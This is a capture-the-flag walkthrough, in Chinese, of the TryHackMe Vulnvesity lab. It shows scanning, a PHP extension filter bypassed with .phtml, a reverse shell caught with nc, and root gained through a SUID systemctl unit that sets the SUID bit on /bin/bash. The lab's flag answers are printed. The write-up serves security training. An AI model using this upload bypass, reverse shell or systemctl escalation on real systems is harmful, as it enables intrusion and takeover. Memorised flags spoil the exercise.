# TryHackMe -- Vulnversity


# THM - Vulnversity

## Reconnaissance

### Scan the box; how many ports are open?

nmap扫描，同时扫一下服务：

```shell
┌──(v4ler1an㉿kali)-[~/tmp]
└─$ sudo nmap -T4 -sV 10.10.189.32
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-05 20:51 EST
Nmap scan report for localhost (10.10.189.32)
Host is up (0.35s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3128/tcp open  http-proxy  Squid http proxy 3.5.12
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.45 seconds
```

### What version of the squid proxy is running on the machine?

squid proxy的版本，使用`-sV`参数直接确定扫描的端口对应的服务，3.5.12。

### How many ports will Nmap scan if the flag **-p-400** was used?

范围扫描端口，这里会扫描0-400的端口范围。

### What is the most likely operating system this machine is running?

具体发行版本根据22端口的ssh服务可以确定是ubuntu。

### What port is the web server running on?

web服务，看运行的web组件-Apache就可以，端口为3333。

### What is the flag for enabling verbose mode using Nmap?

查看nmap运行过程中的具体信息，使用`-v`或者`-vv`选项。

## Locating directories using Gobuster

### What is the directory that has an upload form page?

首先访问一下3333端口的web服务，没有发现任何的输入框和按钮，然后使用gobuster进行目录扫描：

```shell
┌──(v4ler1an㉿kali)-[~/tmp/nmap]
└─$ gobuster dir -u http://10.10.189.32:3333 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 64
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.189.32:3333
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 320] [--> http://10.10.189.32:3333/images/]
/css                  (Status: 301) [Size: 317] [--> http://10.10.189.32:3333/css/]
/js                   (Status: 301) [Size: 316] [--> http://10.10.189.32:3333/js/]
/fonts                (Status: 301) [Size: 319] [--> http://10.10.189.32:3333/fonts/]
/internal             (Status: 301) [Size: 322] [--> http://10.10.189.32:3333/internal/]
Progress: 7194 / 87665 (8.21%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 7275 / 87665 (8.30%)
===============================================================
Finished
===============================================================

┌──(v4ler1an㉿kali)-[~/tmp/nmap]
└─$ gobuster dir -u http://10.10.189.32:3333/internal/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 64
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.189.32:3333/internal/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/uploads              (Status: 301) [Size: 330] [--> http://10.10.189.32:3333/internal/uploads/]
/css                  (Status: 301) [Size: 326] [--> http://10.10.189.32:3333/internal/css/]
Progress: 10838 / 87665 (12.36%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 10856 / 87665 (12.38%)
===============================================================
Finished
===============================================================
```

在internal目录下存在upload路径。

## Compromise the Webserver

### What common file type you'd want to upload to exploit the server is blocked? Try a couple to find out.

确认被禁止上传的文件类型，一般情况下是可运行的代码文件或者可执行文件，这里测试出来是php文件

![image-20240306095906609](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403060959346.png)

### Run this attack, what extension is allowed?

对可上传文件类型进行fuzz，使用burp，替换php后缀：

![image-20240306101529735](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061015767.png)

![image-20240306101510876](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061015913.png)

这里我只改了php这三个字符，没有加前面的.号。在测试时发现，如果针对.php进行fuzz，fuzz过程中会把.转换为%2e，导致fuzz出错，就没有再去改。

![image-20240306102012814](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061020865.png)

修改方法是在payloads里设置一下最下面的编码：

![image-20240306101809258](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061018316.png)

去掉选项或者去掉.号。

### What is the name of the user who manages the webserver?

本地监听，访问反弹shell的php文件`http://[ip]:3333/internal/uploads/php_reverse_shell.phtml`:

```shell
┌──(v4ler1an㉿kali)-[~/Documents/tools]
└─$ sudo nc -lvvp 4444
listening on [any] 4444 ...
connect to [10.2.124.22] from localhost [10.10.189.32] 35864
Linux vulnuniversity 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 21:33:42 up 57 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

找网站的管理员，看家目录用户即可：

```SHELL
$ cd /home
$ ls
bill
```

### What is the user flag?

```shell
$ cd bill
$ ls
user.txt
$cat user.txt
8bd7992fbe8a6ad22a63361004cfcedb
```

## Privilege Escalation

提权，利用SUID：

```shell
$ find / -user root -perm -4000 -exec ls -la {} 2>/dev/null \;
-rwsr-xr-x 1 root root 32944 May 16  2017 /usr/bin/newuidmap
-rwsr-xr-x 1 root root 49584 May 16  2017 /usr/bin/chfn
-rwsr-xr-x 1 root root 32944 May 16  2017 /usr/bin/newgidmap
-rwsr-xr-x 1 root root 136808 Jul  4  2017 /usr/bin/sudo
-rwsr-xr-x 1 root root 40432 May 16  2017 /usr/bin/chsh
-rwsr-xr-x 1 root root 54256 May 16  2017 /usr/bin/passwd
-rwsr-xr-x 1 root root 23376 Jan 15  2019 /usr/bin/pkexec
-rwsr-xr-x 1 root root 39904 May 16  2017 /usr/bin/newgrp
-rwsr-xr-x 1 root root 75304 May 16  2017 /usr/bin/gpasswd
-rwsr-sr-x 1 root root 98440 Jan 29  2019 /usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root root 14864 Jan 15  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 428240 Jan 31  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 76408 Jul 17  2019 /usr/lib/squid/pinger
-rwsr-xr-- 1 root messagebus 42992 Jan 12  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 38984 Jun 14  2017 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-rwsr-xr-x 1 root root 40128 May 16  2017 /bin/su
-rwsr-xr-x 1 root root 142032 Jan 28  2017 /bin/ntfs-3g
-rwsr-xr-x 1 root root 40152 May 16  2018 /bin/mount
-rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6
-rwsr-xr-x 1 root root 27608 May 16  2018 /bin/umount
-rwsr-xr-x 1 root root 659856 Feb 13  2019 /bin/systemctl
-rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping
-rwsr-xr-x 1 root root 30800 Jul 12  2016 /bin/fusermount
-rwsr-xr-x 1 root root 35600 Mar  6  2017 /sbin/mount.cifs
```

这里使用systemctl，在GtfoBins找到需要执行的命令：

```shell
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "id > /tmp/output"
[Install]
WantedBy=multi-user.target' > $TF
./systemctl link $TF
./systemctl enable --now $TF
```

依次输入：

```shell
$ cd bin
$ TF1=$(mktemp).service
$ echo '[Service]
> Type=oneshot
> ExecStart=/bin/sh -c "chmod +s /bin/bash"
> [Install]
> WantedBy=multi-user.target' > $TF1
$ ./systemctl link $TF1
Created symlink from /etc/systemd/system/tmp.uQywY2kLc2.service to /tmp/tmp.uQywY2kLc2.service.
$ ./systemctl enable --now $TF1
Created symlink from /etc/systemd/system/multi-user.target.wants/tmp.uQywY2kLc2.service to /tmp/tmp.uQywY2kLc2.service.
$ cat /tmp/output
uid=0(root) gid=0(root) groups=0(root)
```

查看flag：

```shell
┌──(v4ler1an㉿kali)-[~/Documents/tools/nessus]
└─$ sudo nc -lvvp 4444
[sudo] password for v4ler1an:
listening on [any] 4444 ...
connect to [10.2.124.22] from localhost [10.10.189.32] 35874
Linux vulnuniversity 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 21:56:29 up  1:20,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ TF1=$(mktemp).service
$ echo '[Service]
> Type=oneshot
> ExecStart=/bin/sh -c "chmod +s /bin/bash"
> [Install]
> WantedBy=multi-user.target' > $TF1
$ /bin/systemctl link $TF1
Created symlink from /etc/systemd/system/tmp.EKpuGvy4Ae.service to /tmp/tmp.EKpuGvy4Ae.service.
$ /bin/systemctl enable --now $TF1
Created symlink from /etc/systemd/system/multi-user.target.wants/tmp.EKpuGvy4Ae.service to /tmp/tmp.EKpuGvy4Ae.service.
$ /bin/bash -p
whoami
root
cat /root/root.txt
a58ff8579f0a9270368d33a9966c7fd5

```


